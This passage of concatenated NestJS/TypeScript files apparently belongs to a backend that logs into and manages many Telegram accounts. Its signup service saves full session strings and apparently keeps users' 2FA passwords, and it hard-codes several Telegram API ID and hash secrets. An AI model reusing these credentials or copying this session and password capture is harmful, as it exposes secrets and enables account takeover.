@IsOptional()\r\n  photo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  video?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  voice?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Document message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  document?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVideo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVoice?: MessageTypeResult;\r\n}","import { IsString, IsNumber, IsOptional, IsArray, IsBoolean, Min, Max, Length, ArrayMinSize, ArrayMaxSize, IsNotEmpty, IsEnum } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MetadataType {\r\n    PHOTO = 'photo',\r\n    VIDEO = 'video',\r\n    DOCUMENT = 'document'\r\n}\r\n\r\nexport class MediaMetadataDto {\r\n    @ApiProperty({ description: 'Chat ID to get metadata from' })\r\n    @IsString()\r\n    chatId: string;\r\n\r\n    @ApiProperty({ description: 'Message offset', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    offset?: number;\r\n\r\n    @ApiProperty({ description: 'Maximum number of items', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    limit?: number = 50;\r\n}\r\n\r\nexport class DialogsQueryDto {\r\n    @ApiPropertyOptional({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(1)\r\n    @Max(1000)\r\n    limit: number = 100;\r\n\r\n    @ApiPropertyOptional({ description: 'Dialog offset', required: false, type: Number, minimum: 0 })\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    @IsNumber()\r\n    @Min(0)\r\n    offsetId?: number = 0;\r\n\r\n    @ApiPropertyOptional({ description: 'Include archived chats', required: false, type: Boolean })\r\n    @IsOptional()\r\n    @Transform(({ value }) => {\r\n        if (value === 'true') return true;\r\n        if (value === 'false') return false;\r\n        return value;\r\n    })\r\n    @IsBoolean()\r\n    archived?: boolean = false;\r\n}\r\n\r\nexport class BulkMessageOperationDto {\r\n    @ApiProperty({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    fromChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    toChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 })\r\n    @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n    messageIds!: number[];\r\n}","import { IsString, IsOptional, IsEnum, IsBoolean } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { PrivacyLevel, PrivacyLevelEnum } from '../../../interfaces/telegram';\r\n\r\nexport class UpdateProfileDto {\r\n  @ApiProperty({ description: 'First name' })\r\n  @IsString()\r\n  firstName: string;\r\n\r\n  @ApiProperty({ description: 'About/bio information', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n}\r\n\r\nexport class PrivacySettingsDto {\r\n  @ApiProperty({ description: 'Phone number visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  phoneNumber?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Last seen visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  lastSeen?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Profile photos visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  profilePhotos?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Message forwards visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  forwards?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Calls privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  calls?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Group chats privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  groups?: PrivacyLevel;\r\n}\r\n\r\nexport class SecuritySettingsDto {\r\n  @ApiProperty({ description: 'Enable/disable two-factor authentication' })\r\n  @IsBoolean()\r\n  twoFactorAuth: boolean;\r\n\r\n  @ApiProperty({ description: 'Active sessions limit', required: false })\r\n  @IsOptional()\r\n  @IsEnum([1, 2, 3, 4, 5])\r\n  activeSessionsLimit?: number;\r\n}\r\n\r\nexport class ProfilePhotoDto {\r\n  @ApiProperty({ description: 'Name/identifier of the photo to set' })\r\n  @IsString()\r\n  name: string;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsDateString } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { BaseBatchItemDto } from './batch-operations.dto';\r\n\r\nexport class ScheduleMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message content' })\r\n  @IsString()\r\n  message: string;\r\n\r\n  @ApiProperty({ description: 'Date to schedule the message' })\r\n  @IsDateString()\r\n  @Transform(({ value }) => new Date(value))\r\n  scheduledTime: string;\r\n\r\n  @ApiProperty({ description: 'Message to reply to', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  replyTo?: number;\r\n\r\n  @ApiProperty({ description: 'Silent notification', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  silent?: boolean;\r\n}\r\n\r\nexport class GetScheduledMessagesDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Maximum number of messages to return', required: false, default: 50 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class DeleteScheduledMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'ID of the scheduled message to delete' })\r\n  @IsNumber()\r\n  messageId: number;\r\n}\r\n\r\nexport class RescheduleMessageDto {\r\n  @ApiProperty({ description: 'Chat ID containing the message' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID to reschedule' })\r\n  @IsNumber()\r\n  messageId: number;\r\n\r\n  @ApiProperty({ description: 'New schedule date (ISO string)' })\r\n  @IsDateString()\r\n  newScheduleDate: string;\r\n}\r\n\r\nexport class BatchProcessItemDto {\r\n  @ApiProperty({ description: 'Chat ID or message ID depending on operation' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID for operations that require it', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsOptional } from 'class-validator';\n\nexport class SendMessageDto {\n  @ApiProperty({\n    description: 'Target username or peer ID',\n    example: 'someusername',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiProperty({\n    description: 'Message text to send',\n    example: 'Hello from NestJS and GramJS!',\n  })\n  @IsString()\n  message: string;\n\n  @ApiProperty({\n    description: 'Optional message parse mode (Markdown, HTML)',\n    required: false,\n    example: 'Markdown',\n  })\n  @IsOptional()\n  @IsString()\n  parseMode?: 'Markdown' | 'HTML';\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString } from 'class-validator';\n\nexport class UpdateUsernameDto {\n  @ApiProperty({\n    description: 'New username to set for the Telegram user',\n    example: 'new_username123',\n  })\n  @IsString()\n  newUsername: string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsEnum, IsNotEmpty, IsOptional, IsString, ValidateIf } from 'class-validator';\r\n\r\nexport enum MediaSourceType {\r\n    PATH = 'path',\r\n    BASE64 = 'base64',\r\n    BINARY = 'binary'\r\n}\r\n\r\nexport class ViewOnceMediaDto {\r\n    @ApiProperty({\r\n        description: 'Chat ID to send the view once media to',\r\n        example: '123456789'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    chatId: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Source type of the media: url, base64, or binary',\r\n        enum: MediaSourceType,\r\n        example: 'url'\r\n    })\r\n    @IsEnum(MediaSourceType)\r\n    @IsNotEmpty()\r\n    sourceType: MediaSourceType;\r\n\r\n    @ApiProperty({\r\n        description: 'URL of the media file (when sourceType is url)',\r\n        required: false,\r\n        example: 'https://example.com/image.jpg'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.PATH)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    path?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Base64 encoded media data (when sourceType is base64)',\r\n        required: false,\r\n        example: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BASE64)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    base64Data?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Binary media data (when sourceType is binary)',\r\n        required: false,\r\n        type: 'string',\r\n        format: 'binary'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BINARY)\r\n    binaryData?: any;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional caption for the media',\r\n        required: false,\r\n        example: 'Check this out! It will disappear after viewing'\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    caption?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional filename for the media',\r\n        required: false,\r\n        example: 'secret_image.jpg'\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    filename?: string;\r\n}","import TelegramManager from '../TelegramManager';\r\nimport { parseError } from '../../../utils/parseError';\r\nimport { TelegramLogger } from './telegram-logger';\r\nimport { BadRequestException } from '@nestjs/common';\r\nimport { UsersService } from '../../../components/users/users.service';\r\nimport { TelegramClient } from 'telegram';\r\nimport { contains } from '../../../utils';\r\nimport { BotConfig, ChannelCategory } from '../../../utils/TelegramBots.config';\r\n\r\ninterface ClientInfo {\r\n    client: TelegramManager;\r\n    lastUsed: number;\r\n    autoDisconnect: boolean;\r\n}\r\n\r\ninterface GetClientOptions {\r\n    autoDisconnect?: boolean;\r\n    handler?: boolean;\r\n}\r\n\r\nclass ConnectionManager {\r\n    private static instance: ConnectionManager;\r\n    private clients: Map<string, ClientInfo>;\r\n    private readonly logger: TelegramLogger;\r\n    private cleanupInterval: NodeJS.Timeout | null = null;\r\n    private usersService: UsersService;\r\n\r\n    private constructor() {\r\n        this.clients = new Map();\r\n        this.logger = TelegramLogger.getInstance();\r\n    }\r\n\r\n    public setUsersService(usersService: UsersService) {\r\n        this.usersService = usersService;\r\n    }\r\n\r\n    public static getInstance(): ConnectionManager {\r\n        if (!ConnectionManager.instance) {\r\n            ConnectionManager.instance = new ConnectionManager();\r\n        }\r\n        return ConnectionManager.instance;\r\n    }\r\n\r\n    private async cleanupInactiveConnections(maxIdleTime: number = 180000): Promise<void> {\r\n        const now = Date.now();\r\n        for (const [mobile, connection] of this.clients.entries()) {\r\n            // Skip clients that are configured to be excluded from cleanup\r\n            if (!connection.autoDisconnect) {\r\n                continue;\r\n            }\r\n            if (now - connection.lastUsed > maxIdleTime) {\r\n                this.logger.logOperation(mobile, 'Releasing inactive connection');\r\n                await this.unregisterClient(mobile);\r\n            }\r\n        }\r\n    }\r\n\r\n    private updateLastUsed(mobile: string): void {\r\n        const connection = this.clients.get(mobile);\r\n        if (connection) {\r\n            connection.lastUsed = Date.now();\r\n            this.clients.set(mobile, connection);\r\n        }\r\n    }\r\n\r\n    public async getClient(mobile: string, options: GetClientOptions = {}): Promise<TelegramManager | undefined> {\r\n        if (!mobile) {\r\n            this.logger.logDebug('system', 'getClient called with empty mobile number');\r\n            return undefined;\r\n        }\r\n\r\n        const { autoDisconnect = true, handler = true, } = options;\r\n\r\n        this.logger.logOperation(mobile, 'Getting/Creating client', { autoDisconnect, handler });\r\n        const clientInfo = this.clients.get(mobile);\r\n        if (clientInfo?.client) {\r\n            this.updateLastUsed(mobile);\r\n            if (clientInfo.client.connected()) {\r\n                this.logger.logOperation(mobile, 'Reusing existing connected client');\r\n                return clientInfo.client;\r\n            } else {\r\n                try {\r\n                    this.logger.logOperation(mobile, 'Reconnecting existing client');\r\n                    await clientInfo.client.connect();\r\n                    return clientInfo.client;\r\n                } catch (error) {\r\n                    this.logger.logError(mobile, 'Failed to reconnect client', error);\r\n                    await this.unregisterClient(mobile); // Clean up failed connection\r\n                }\r\n            }\r\n        }\r\n\r\n        if (!this.usersService) {\r\n            throw new Error('UsersService not initialized');\r\n        }\r\n\r\n        const user = (await this.usersService.search({ mobile }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n\r\n        const telegramManager = new TelegramManager(user.session, user.mobile);\r\n        let client: TelegramClient;\r\n\r\n        try {\r\n            client = await telegramManager.createClient(handler);\r\n            await client.getMe();\r\n\r\n            if (client) {\r\n                await this.registerClient(\r\n                    mobile,\r\n                    telegramManager,\r\n                    { autoDisconnect }\r\n                );\r\n                this.logger.logOperation(mobile, 'Client created successfully');\r\n                return telegramManager;\r\n            } else {\r\n                throw new BadRequestException('Client Expired');\r\n            }\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Client creation failed', error);\r\n            this.logger.logDebug(mobile, 'Parsing error details...');\r\n            await this.unregisterClient(mobile);\r\n            const errorDetails = parseError(error, mobile, false);\r\n            await BotConfig.getInstance().sendMessage(ChannelCategory.ACCOUNT_LOGIN_FAILURES, `${process.env.clientId}::${mobile}\\n\\n${errorDetails.message}`);\r\n            if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"revoked\", \"user_deactivated_ban\"])) {\r\n                this.logger.logOperation(mobile, 'Marking user as expired');\r\n                await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\r\n            }\r\n            throw new BadRequestException(errorDetails.message);\r\n        }\r\n    }\r\n\r\n    public hasClient(number: string): boolean {\r\n        return this.clients.has(number);\r\n    }\r\n\r\n    public async disconnectAll(): Promise<void> {\r\n        this.logger.logOperation('system', 'Disconnecting all clients');\r\n        const clientMobiles = Array.from(this.clients.keys());\r\n        await Promise.all(\r\n            clientMobiles.map(mobile => {\r\n                this.logger.logOperation(mobile, 'Disconnecting client');\r\n                return this.unregisterClient(mobile);\r\n            })\r\n        );\r\n        this.clients.clear();\r\n        this.logger.logOperation('system', 'All clients disconnected');\r\n    }\r\n\r\n    private async registerClient(\r\n        mobile: string,\r\n        telegramManager: TelegramManager,\r\n        options: { autoDisconnect: boolean } = { autoDisconnect: true }\r\n    ): Promise<void> {\r\n        this.clients.set(mobile, {\r\n            client: telegramManager,\r\n            lastUsed: Date.now(),\r\n            autoDisconnect: options.autoDisconnect\r\n        });\r\n        this.logger.logOperation(mobile, `Client registered successfully${!options.autoDisconnect ? ' (excluded from auto-cleanup)' : ''}`);\r\n    }\r\n\r\n    public async unregisterClient(\r\n        mobile: string,\r\n    ): Promise<void> {\r\n        try {\r\n            const clientInfo = this.clients.get(mobile);\r\n            if (clientInfo) {\r\n                await clientInfo.client?.disconnect();\r\n                this.logger.logOperation(mobile, 'Client unregistered successfully');\r\n            } else {\r\n                this.logger.logError(mobile, 'Client not found for unregistration', new Error('Client not found'));\r\n            }\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Error in unregisterClient', error);\r\n        } finally {\r\n            this.clients.delete(mobile);\r\n        }\r\n    }\r\n\r\n    public getActiveConnectionCount(): number {\r\n        return this.clients.size;\r\n    }\r\n\r\n    public startCleanupInterval(intervalMs: number = 300000): NodeJS.Timeout {\r\n        this.cleanupInterval = setInterval(() => {\r\n            this.cleanupInactiveConnections().catch(err => {\r\n                this.logger.logError('system', 'Error in cleanup interval', err);\r\n            });\r\n        }, intervalMs);\r\n        return this.cleanupInterval;\r\n    }\r\n\r\n    public stopCleanupInterval(): void {\r\n        if (this.cleanupInterval) {\r\n            clearInterval(this.cleanupInterval);\r\n            this.cleanupInterval = null;\r\n        }\r\n    }\r\n}\r\n\r\nexport const connectionManager = ConnectionManager.getInstance();\r\n","import { Logger } from '@nestjs/common';\r\n\r\nexport class TelegramLogger {\r\n    private static instance: TelegramLogger;\r\n    private logger: Logger;\r\n\r\n    private constructor() {\r\n        this.logger = new Logger('TelegramService');\r\n    }\r\n\r\n    static getInstance(): TelegramLogger {\r\n        if (!TelegramLogger.instance) {\r\n            TelegramLogger.instance = new TelegramLogger();\r\n        }\r\n        return TelegramLogger.instance;\r\n    }\r\n\r\n    logOperation(mobile: string, operation: string, details?: any): void {\r\n        this.logger.log(`[${mobile}] ${operation} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logError(mobile: string, operation: string, error: any): void {\r\n        this.logger.error(\r\n            `[${mobile}] ${operation} failed - ${error.message}`,\r\n            error.stack\r\n        );\r\n    }\r\n\r\n    logWarning(mobile: string, message: string, details?: any): void {\r\n        this.logger.warn(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n\r\n    logDebug(mobile: string, message: string, details?: any): void {\r\n        this.logger.debug(`[${mobile}] ${message} - ${JSON.stringify(details || {})}`);\r\n    }\r\n}","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TgSignupController } from './tgSignup.controller';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { TgSignupService } from './TgSignup.service';\r\n\r\n@Module({\r\n    imports: [forwardRef(() => UsersModule)],\r\n    controllers: [TgSignupController],\r\n    providers: [TgSignupService],\r\n    exports: [TgSignupService]\r\n})\r\nexport class TgSignupModule { }\r\n","import { Injectable, BadRequestException, Logger, InternalServerErrorException, OnModuleDestroy } from \"@nestjs/common\";\r\nimport { Api } from \"telegram/tl\";\r\nimport { TelegramClient } from \"telegram\";\r\nimport { StringSession } from \"telegram/sessions\";\r\nimport { LogLevel } from \"telegram/extensions/Logger\";\r\nimport { computeCheck } from \"telegram/Password\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { UsersService } from \"../users/users.service\";\r\nimport { TgSignupResponse } from \"./dto/tg-signup.dto\";\r\nimport { CreateUserDto } from \"../users/dto/create-user.dto\";\r\nimport { parseError } from \"../../utils/parseError\";\r\n\r\ninterface ITelegramCredentials {\r\n    apiId: number;\r\n    apiHash: string;\r\n}\r\n\r\n@Injectable()\r\nexport class TgSignupService implements OnModuleDestroy {\r\n    private readonly logger = new Logger(TgSignupService.name);\r\n    private static readonly LOGIN_TIMEOUT = 300000; // 10 minutes instead of 2.5\r\n    private static readonly SESSION_CLEANUP_INTERVAL = 300000; // 5 minutes instead of 2\r\n    private static readonly PHONE_PREFIX = \"+\"; // Prefix for phone numbers\r\n    private readonly cleanupInterval: NodeJS.Timeout;\r\n\r\n    // Map to store active client sessions\r\n    private static readonly activeClients = new Map<string, {\r\n        client: TelegramClient;\r\n        phoneCodeHash: string;\r\n        timeoutId: NodeJS.Timeout;\r\n        createdAt: number;\r\n    }>();\r\n\r\n    // API credentials pool for load balancing with correct hashes\r\n    private static readonly API_CREDENTIALS: ITelegramCredentials[] = [\r\n        { apiId: 27919939, apiHash: \"5ed3834e741b57a560076a1d38d2fa94\" },\r\n        { apiId: 25328268, apiHash: \"b4e654dd2a051930d0a30bb2add80d09\" },\r\n        { apiId: 12777557, apiHash: \"05054fc7885dcfa18eb7432865ea3500\" },\r\n        { apiId: 27565391, apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\" },\r\n        { apiId: 27586636, apiHash: \"f020539b6bb5b945186d39b3ff1dd998\" },\r\n        { apiId: 29210552, apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\" }\r\n    ];\r\n\r\n    constructor(private readonly usersService: UsersService) {\r\n        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService.SESSION_CLEANUP_INTERVAL);\r\n    }\r\n\r\n    async onModuleDestroy() {\r\n        clearInterval(this.cleanupInterval);\r\n        // Cleanup all active sessions\r\n        const phones = Array.from(TgSignupService.activeClients.keys());\r\n        await Promise.all(phones.map(phone => this.disconnectClient(phone)));\r\n    }\r\n\r\n    private getRandomCredentials(): ITelegramCredentials {\r\n        const index = Math.floor(Math.random() * TgSignupService.API_CREDENTIALS.length);\r\n        return TgSignupService.API_CREDENTIALS[index];\r\n    }\r\n\r\n    private async cleanupStaleSessions() {\r\n        for (const [phone, session] of TgSignupService.activeClients) {\r\n            try {\r\n                // Only cleanup if session is truly stale (disconnected and timeout exceeded)\r\n                if (Date.now() - session.createdAt > TgSignupService.LOGIN_TIMEOUT &&\r\n                    (!session.client || !session.client.connected)) {\r\n                    await this.disconnectClient(phone);\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);\r\n            }\r\n        }\r\n    }\r\n\r\n    private validatePhoneNumber(phone: string): string {\r\n        // Remove any existing + prefix\r\n        phone = phone.replace(/^\\+/, '');\r\n\r\n        // Validate phone number format\r\n        if (!/^\\d{8,15}$/.test(phone)) {\r\n            throw new BadRequestException('Please enter a valid phone number');\r\n        }\r\n\r\n        return phone;\r\n    }\r\n\r\n    private async disconnectClient(phone: string): Promise<void> {\r\n        const session = TgSignupService.activeClients.get(phone);\r\n        if (session) {\r\n            try {\r\n                clearTimeout(session.timeoutId);\r\n                if (session.client?.connected) {\r\n                    await session.client.disconnect();\r\n                }\r\n                if (session.client) {\r\n                    await session.client.destroy();\r\n                }\r\n            } catch (error) {\r\n                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);\r\n            } finally {\r\n                TgSignupService.activeClients.delete(phone);\r\n            }\r\n        }\r\n    }\r\n\r\n    async sendCode(phone: string): Promise<Pick<TgSignupResponse, 'phoneCodeHash' | 'isCodeViaApp'>> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            // Check if there's an existing active session that can be reused\r\n            const existingSession = TgSignupService.activeClients.get(phone);\r\n            if (existingSession && existingSession.client?.connected) {\r\n                // If session exists and is still valid, disconnect it before creating new one\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            const { apiId, apiHash } = this.getRandomCredentials();\r\n            const session = new StringSession('');\r\n            const client = new TelegramClient(session, apiId, apiHash, {\r\n                connectionRetries: 5,\r\n                retryDelay: 2000,\r\n                useWSS: true,\r\n                timeout: 30000\r\n            });\r\n\r\n            await client.setLogLevel(LogLevel.ERROR);\r\n\r\n            await client.connect();\r\n\r\n            const sendResult = await client.invoke(\r\n                new Api.auth.SendCode({\r\n                    phoneNumber: phone,\r\n                    apiId,\r\n                    apiHash,\r\n                    settings: new Api.CodeSettings({\r\n                        currentNumber: true,\r\n                        allowAppHash: true,\r\n                    }),\r\n                })\r\n            );\r\n\r\n            if (sendResult instanceof Api.auth.SentCodeSuccess) {\r\n                this.logger.error(`Unexpected immediate login for ${phone}`);\r\n                throw new BadRequestException('Unexpected immediate login');\r\n            }\r\n            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            TgSignupService.activeClients.set(phone, {\r\n                client,\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                timeoutId,\r\n                createdAt: Date.now()\r\n            });\r\n\r\n            return {\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                isCodeViaApp: sendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);\r\n            await this.disconnectClient(phone);\r\n            \r\n            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {\r\n                throw new BadRequestException('This phone number has been banned from Telegram');\r\n            }\r\n            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {\r\n                throw new BadRequestException('Please enter a valid phone number');\r\n            }\r\n            if (error.errorMessage?.includes('FLOOD_WAIT')) {\r\n                throw new BadRequestException('Please wait a few minutes before trying again');\r\n            }\r\n            \r\n            throw new BadRequestException('Unable to send OTP. Please try again');\r\n        }\r\n    }\r\n\r\n    async verifyCode(phone: string, code: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            const session = TgSignupService.activeClients.get(phone);\r\n            if (!session) {\r\n                this.logger.warn(`No active signup session found for ${phone}`);\r\n                throw new BadRequestException('Session Expired. Please start again');\r\n            }\r\n\r\n            // Always extend session timeout on verification attempt, regardless of success\r\n            clearTimeout(session.timeoutId);\r\n            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            if (!session.client?.connected) {\r\n                try {\r\n                    await session.client?.connect();\r\n                } catch (error) {\r\n                    // Don't disconnect, just try to reconnect\r\n                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);\r\n                    try {\r\n                        const { apiId, apiHash } = this.getRandomCredentials();\r\n                        const newSession = new StringSession('');\r\n                        const newClient = new TelegramClient(newSession, apiId, apiHash, {\r\n                            connectionRetries: 5,\r\n                            retryDelay: 2000,\r\n                            useWSS: true,\r\n                            timeout: 30000\r\n                        });\r\n                        await newClient.connect();\r\n                        session.client = newClient;\r\n                    } catch (reconnectError) {\r\n                        throw new BadRequestException('Connection failed. Please try verifying again.');\r\n                    }\r\n                }\r\n            }\r\n\r\n            const { client, phoneCodeHash } = session;\r\n\r\n            try {\r\n                this.logger.debug(`Attempting to sign in with code for ${phone}`);\r\n                const signInResult = await client.invoke(\r\n                    new Api.auth.SignIn({\r\n                        phoneNumber: phone,\r\n                        phoneCodeHash,\r\n                        phoneCode: code,\r\n                    })\r\n                ) as Api.auth.Authorization;\r\n\r\n                if (!signInResult) {\r\n                    throw new BadRequestException('Invalid response from Telegram server');\r\n                }\r\n\r\n                if (signInResult instanceof Api.auth.AuthorizationSignUpRequired) {\r\n                    this.logger.log(`New user registration required for ${phone}`);\r\n                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);\r\n                    await this.disconnectClient(phone);\r\n                    return result;\r\n                }\r\n\r\n                // Store the session string before processing\r\n                const sessionString = client.session.save() as unknown as string;\r\n                if (!sessionString) {\r\n                    throw new Error('Failed to generate session string');\r\n                }\r\n\r\n                const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n                await this.disconnectClient(phone);\r\n                return userData;\r\n            } catch (error) {\r\n                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {\r\n                    this.logger.warn(`2FA required for ${phone}`);\r\n                    if (!password) {\r\n                        return {\r\n                            status: 400,\r\n                            message: 'Two-factor authentication required',\r\n                            requires2FA: true\r\n                        };\r\n                    }\r\n                    return await this.handle2FALogin(phone, session.client, password);\r\n                }\r\n                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||\r\n                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {\r\n                    throw new BadRequestException('Invalid OTP,  Try again!');\r\n                }\r\n\r\n                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);\r\n                throw new BadRequestException('Verification failed. Please try again.');\r\n            }\r\n        } catch (error) {\r\n            this.logger.error(`Verification error for ${phone}: ${error.message}`);\r\n\r\n            if (error.message?.includes('No active signup session') ||\r\n                error.message?.includes('Connection failed')) {\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            throw error instanceof BadRequestException ? error :\r\n                new BadRequestException(error.message || 'Verification failed, please try again');\r\n        }\r\n    }\r\n\r\n    private async handle2FALogin(phone: string, client: TelegramClient, password: string): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`Fetching password SRP parameters for ${phone}`);\r\n            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());\r\n\r\n            this.logger.debug(`Computing password check for ${phone}`);\r\n            const passwordCheck = await computeCheck(passwordSrpResult, password);\r\n\r\n            this.logger.debug(`Invoking CheckPassword API for ${phone}`);\r\n            const signInResult = await client.invoke(\r\n                new Api.auth.CheckPassword({\r\n                    password: passwordCheck,\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signInResult || !signInResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            this.logger.log(`2FA login successful for ${phone}`);\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n            await this.disconnectClient(phone);\r\n            return userData;\r\n        } catch (error) {\r\n            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);\r\n            if (password) {\r\n                throw new BadRequestException('Incorrect 2FA password');\r\n            }\r\n            